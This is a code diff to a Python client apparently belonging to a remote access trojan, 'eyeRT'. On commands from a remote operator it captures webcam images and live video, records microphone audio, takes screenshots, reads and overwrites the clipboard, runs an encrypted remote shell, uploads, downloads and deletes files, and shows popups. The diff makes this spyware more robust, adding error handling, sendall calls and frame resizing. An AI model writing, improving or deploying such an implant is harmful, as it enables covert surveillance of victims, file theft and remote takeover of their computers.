@@ -1,16 +1,13 @@
 from os import listdir, chdir, path, remove, getcwd
 import socket
 from select import select
-import cv2
 from json import dumps, loads
 from numpy import array, uint8
 import pyaudio
 from time import sleep
-from pyautogui import screenshot
 from shutil import rmtree
 from cryptography.fernet import Fernet
 from subprocess import check_output, STDOUT
-from pymsgbox import alert, confirm, prompt, password
 from PIL import Image
 from platform import machine, version, platform, processor
 from platform import system as sys_info
@@ -19,6 +16,7 @@ from clipboard import paste, copy
 
 
 def popup(conn: socket.socket, command: str) -> None:
+    from pymsgbox import alert, confirm, prompt, password
     parts = command.strip().split("|")
     if len(parts) < 2:
         return
@@ -39,30 +37,40 @@ def popup(conn: socket.socket, command: str) -> None:
 
 
 def hd_alert(conn: socket.socket) -> None:
+    import cv2
     data = ""
-    while True:
-        rc_data = conn.recv(40000).decode()
-        if "END" in rc_data[-3:]:
-            data += rc_data[:-3]
-            break
-        data += rc_data
-    cv_img = array(loads(data)).astype(uint8)
-    img = Image.fromarray(cv_img)
-    for _ in range(10000):
-        img.show()
+    try:
+        while True:
+            rc_data = conn.recv(40000).decode()
+            if "END" in rc_data[-3:]:
+                data += rc_data[:-3]
+                break
+            data += rc_data
+        cv_img = array(loads(data)).astype(uint8)
+        img = Image.fromarray(cv_img)
+        for _ in range(10000):
+            img.show()
+    except Exception:
+        return
 
 
 def clipboard(command: str, conn: socket.socket) -> None:
     if command == "GCLPB":
-        conn.send((paste() + "ENDeyeRT").encode())
+        try:
+            conn.sendall((paste() + "ENDeyeRT").encode())
+        except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError, socket.error):
+            return
     elif command == "WCLPB":
         data = ""
-        while True:
-            data2 = conn.recv(10000).decode()
-            if "ENDeyeRT" in data2:
-                data += data2.replace("ENDeyeRT", "")
-                break
-            data += data2
+        try:
+            while True:
+                data2 = conn.recv(10000).decode()
+                if "ENDeyeRT" in data2:
+                    data += data2.replace("ENDeyeRT", "")
+                    break
+                data += data2
+        except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError, socket.error):
+            return
         copy(data)
 
 
@@ -71,7 +79,7 @@ def send_info(conn: socket.socket) -> None:
         root_path = r"C:\\"
     else:
         root_path = "/"
-    conn.send(
+    conn.sendall(
         f"{disk_usage(root_path)}|{virtual_memory()}|{machine()}|{version()}|{platform()}|{processor()}".encode()
     )
 
@@ -99,8 +107,10 @@ def shell_rn(conn: socket.socket, key: bytes) -> None:
     while True:
         try:
             command = _decrypt_fs(conn.recv(1024), key).decode().strip()
-        except AttributeError:
-            continue
+        except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError, socket.error):
+            break
+        except Exception:
+            break
         if command == "GTINFO":
             conn.sendall(_encrypt_fs(f"{socket.gethostname()}[{getcwd()}]", key))
         elif "END" in command:
@@ -108,13 +118,13 @@ def shell_rn(conn: socket.socket, key: bytes) -> None:
         elif command.startswith("cd"):
             parts = command.split(" ", 1)
             if len(parts) == 1:
-                conn.send(_encrypt_fs("So where?", key))
+                conn.sendall(_encrypt_fs("So where?", key))
             else:
                 try:
                     chdir(parts[1].strip())
-                    conn.send(_encrypt_fs("None", key))
+                    conn.sendall(_encrypt_fs("None", key))
                 except Exception:
-                    conn.send(_encrypt_fs(f"cd: {parts[1].strip()}: No such file or directory", key))
+                    conn.sendall(_encrypt_fs(f"cd: {parts[1].strip()}: No such file or directory", key))
         else:
             if "bash" in command:
                 conn.sendall(_encrypt_fs("What do you want from me ?!", key))
@@ -125,41 +135,68 @@ def shell_rn(conn: socket.socket, key: bytes) -> None:
                     out = e
                 try:
                     conn.sendall(_encrypt_fs(out, key))
-                except AttributeError:
+                except Exception:
                     conn.sendall(_encrypt_fs("None", key))
 
 
 def take_scr(conn: socket.socket) -> None:
-    scr = screenshot()
-    arr = array(scr)
-    rgb_list = arr.tolist()
-    dmps = dumps(rgb_list)
-    conn.send(dmps.encode())
+    from pyautogui import screenshot
+    from PIL import Image as PILImage
+    try:
+        scr = screenshot()
+        scr.thumbnail((1024, 1024))
+        arr = array(scr)
+        rgb_list = arr.tolist()
+        dmps = dumps(rgb_list)
+        conn.sendall(dmps.encode())
+    except MemoryError:
+        return
+    except Exception:
+        return
 
 
 def get_pic(conn: socket.socket) -> None:
-    vid = cv2.VideoCapture(0)
-    ret, frame = vid.read()
-    if ret:
-        rgb_list = frame.tolist()
-        dmps = dumps(rgb_list)
-        conn.send(dmps.encode())
+    import cv2
+    try:
+        vid = cv2.VideoCapture(0)
+        ret, frame = vid.read()
+        vid.release()
+        if ret:
+            frame = cv2.resize(frame, (640, 480))
+            rgb_list = frame.tolist()
+            dmps = dumps(rgb_list)
+            conn.sendall(dmps.encode())
+    except MemoryError:
+        return
+    except Exception:
+        return
 
 
 def live(conn: socket.socket) -> None:
+    import cv2
     vid = cv2.VideoCapture(0)
     while True:
         ret, frame = vid.read()
         if not ret:
             break
-        rgb_list = frame.tolist()
-        dmps = dumps(rgb_list)
-        conn.sendall(dmps.encode())
+        try:
+            frame = cv2.resize(frame, (640, 480))
+            rgb_list = frame.tolist()
+            dmps = dumps(rgb_list)
+            conn.sendall(dmps.encode())
+        except MemoryError:
+            break
+        except Exception:
+            break
         conn.send(b"END")
-        flag = conn.recv(1024).decode()
+        try:
+            flag = conn.recv(1024).decode()
+        except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError, socket.error):
+            break
         if flag == "end":
             break
         sleep(0.25)
+    vid.release()
 
 
 def rec_sound(conn: socket.socket) -> None:
@@ -167,7 +204,12 @@ def rec_sound(conn: socket.socket) -> None:
     sample_format = pyaudio.paInt16
     channels = 2
     fs = 44100
-    seconds = int(conn.recv(1024).decode())
+    try:
+        seconds = int(conn.recv(1024).decode())
+    except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError, socket.error):
+        return
+    except Exception:
+        return
     p = pyaudio.PyAudio()
     stream = p.open(format=sample_format, channels=channels, rate=fs, frames_per_buffer=chunk, input=True)
     frames = []
@@ -177,10 +219,10 @@ def rec_sound(conn: socket.socket) -> None:
     stream.stop_stream()
     stream.close()
     p.terminate()
-    conn.send(str(p.get_sample_size(sample_format)).encode())
+    conn.sendall(str(p.get_sample_size(sample_format)).encode())
     sleep(0.25)
     for itm in frames:
-        conn.send(itm)
+        conn.sendall(itm)
 
 
 def dir_exp(conn: socket.socket, command: str) -> None:
@@ -195,9 +237,16 @@ def dir_exp(conn: socket.socket, command: str) -> None:
                     fds += "F:"
                 fds += fd + "\n"
         sleep(0.5)
-        conn.send(fds.encode())
+        try:
+            conn.sendall(fds.encode())
+        except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError, socket.error):
+            return
     elif command.startswith("FXchd:"):
         new_path = command.split(":", 1)[1]
+        if ".." in new_path:
+            sleep(0.5)
+            conn.send(b"The path entered is incorrect !")
+            return
         try:
             chdir(new_path)
             sleep(0.5)
@@ -207,12 +256,15 @@ def dir_exp(conn: socket.socket, command: str) -> None:
             conn.send(b"The path entered is incorrect !")
     elif command.startswith("FXdwn:") or command.startswith("4FXdwn:"):
         file_path = command.split(":", 1)[1]
+        if ".." in file_path:
+            conn.sendall(b"The path entered is incorrect !")
+            return
         buffer = 4096
         try:
             if path.isfile(file_path):
                 file_size = path.getsize(file_path)
                 if command.startswith("FXdwn:"):
-                    conn.send(str(file_size).encode())
+                    conn.sendall(str(file_size).encode())
                 with open(file_path, "rb") as b_file:
                     while True:
                         rdata = b_file.read(buffer)
@@ -222,7 +274,10 @@ def dir_exp(conn: socket.socket, command: str) -> None:
                 if command.startswith("4FXdwn:"):
                     with open(file_path, "wb") as f:
                         while True:
-                            data = conn.recv(buffer)
+                            try:
+                                data = conn.recv(buffer)
+                            except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError, socket.error):
+                                break
                             if "END" in str(data[-3:]):
                                 f.write(data[:-3])
                                 break
@@ -232,25 +287,33 @@ def dir_exp(conn: socket.socket, command: str) -> None:
             else:
                 return
         except FileNotFoundError:
-            conn.send(b"The path entered is incorrect !")
+            conn.sendall(b"The path entered is incorrect !")
             return
     elif command.startswith("FXrmf:"):
         file_path = command.split(":", 1)[1]
+        if ".." in file_path:
+            conn.sendall(b"The path entered is incorrect !")
+            return
         if path.isfile(file_path):
             remove(file_path)
-            conn.send(b"Done !")
+            conn.sendall(b"Done !")
         elif path.isdir(file_path):
             rmtree(file_path)
-            conn.send(b"Done !")
+            conn.sendall(b"Done !")
         else:
-            conn.send(b"Failed! can't find file path !")
+            conn.sendall(b"Failed! can't find file path !")
     elif command.startswith("FXupd:"):
         buffer = 4096
         file_path = command.split(":", 1)[1]
+        if ".." in file_path:
+            return
         try:
             with open(file_path, "wb") as f:
                 while True:
-                    data = conn.recv(buffer)
+                    try:
+                        data = conn.recv(buffer)
+                    except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError, OSError, socket.error):
+                        return
                     if "END" in str(data[-3:]):
                         f.write(data[:-3])
                         break
@@ -260,46 +323,30 @@ def dir_exp(conn: socket.socket, command: str) -> None:
 
 
 def command_runner(conn: socket.socket, command: str, key: bytes) -> None:
-    while True:
-        sleep(0.25)
+    try:
         if command == "Tpict":
             get_pic(conn)
-            conn.send(b"END")
-            break
         elif command == "Rsound":
             rec_sound(conn)
-            conn.send(b"END")
-            break
         elif command == "Glive":
             live(conn)
-            conn.send(b"END")
-            break
         elif command == "Tscr":
             take_scr(conn)
-            conn.send(b"END")
-            break
         elif command.startswith("FX") or command.startswith("4FX"):
             dir_exp(conn, command)
-            conn.send(b"END")
-            break
         elif command == "RMCM":
             shell_rn(conn, key)
-            conn.send(b"END")
-            break
         elif command.startswith("WN"):
             popup(conn, command)
-            conn.send(b"END")
-            break
         elif command == "HDalert":
             hd_alert(conn)
-            conn.send(b"END")
-            break
         elif command in ("GCLPB", "WCLPB"):
             clipboard(command, conn)
-            break
         elif command == "Sinfo":
             send_info(conn)
-            conn.send(b"END")
-            break
-        else:
-            break
+    except Exception:
+        pass
+    try:
+        conn.send(b"END")
+    except Exception:
+        pass
